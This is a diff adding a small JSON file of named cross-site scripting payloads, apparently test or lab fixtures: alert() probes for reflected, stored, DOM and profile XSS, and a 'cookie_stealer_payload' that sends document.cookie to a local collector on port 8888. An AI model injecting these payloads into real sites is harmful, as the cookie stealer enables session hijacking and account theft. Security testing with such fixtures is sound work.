@@ -1,0 +1,7 @@
+{
+  "reflected_xss": "<script>alert('XSS_Reflected')</script>",
+  "stored_xss_review": "<img src=x onerror=alert('XSS_Stored')>",
+  "cookie_stealer_payload": "<script>fetch('http://localhost:8888/log?cookie=' + encodeURIComponent(document.cookie))</script>",
+  "dom_xss_hash": "#<img src=x onerror=alert('DOM_XSS')>",
+  "profile_xss": "<script>alert('Profile_XSS')</script>"
+}
